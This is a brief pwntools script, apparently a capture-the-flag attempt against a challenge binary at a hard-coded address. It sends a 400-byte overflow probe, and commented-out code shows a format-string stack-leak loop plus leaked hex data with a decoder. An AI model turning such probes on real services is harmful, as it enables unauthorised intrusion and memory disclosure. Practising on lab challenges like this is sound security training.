from pwn import *

host, port = "103.127.132.106", 9001

elf = ELF("./chall")

# conn = remote(host, port)
conn = elf.process()
gdb.attach(
    conn,
    """
break
continue
""",
)

# for i in range(1, 300):
# conn.sendline(f"%{i}$llx".encode())

conn.sendline(b"\n" + b"A" * 400)

conn.interactive()

# hex_flag = """2f2e000000000000
# 474e414c006e7770
# 434c003d45474155
# 4c003d454d49545f
# 3d45505954435f43
# 454e4f4d5f434c00
# 4554003d59524154
# 435f434c003d4d52
# 3d4554414c4c4f
# 73752f3d48544150
# 2f6c61636f6c2f72
# 73752f3a6e696273
# 2f6c61636f6c2f72
# 7273752f3a6e6962
# 752f3a6e6962732f
# 2f3a6e69622f7273
# 69622f3a6e696273
# 4444415f434c006e
# 414c003d53534552
# 545f434c003d474e
# 454e4f4850454c45
# 53454d5f434c003d
# 4c003d5345474153
# 3d454d414e5f43
# 555341454d5f434c
# 3d544e454d4552
# 544e4544495f434c
# 4f49544143494649
# 4c415f434c003d4e
# 2f3d445750003d4c
# 454d554e5f434c00
# 5f434c003d434952
# 52003d5245504150
# 4f485f45544f4d45
# 312e3031313d5453
# 33312e33382e3833
# 6e77702f2e0039"""

# block = ""
# for i in range(len(hex_flag)):
#     if hex_flag[i] == "\n":
#         continue
#     block += hex_flag[i]
#     if len(block) == 8:
#         print(p64(int(block, 16)))
#         block = ""
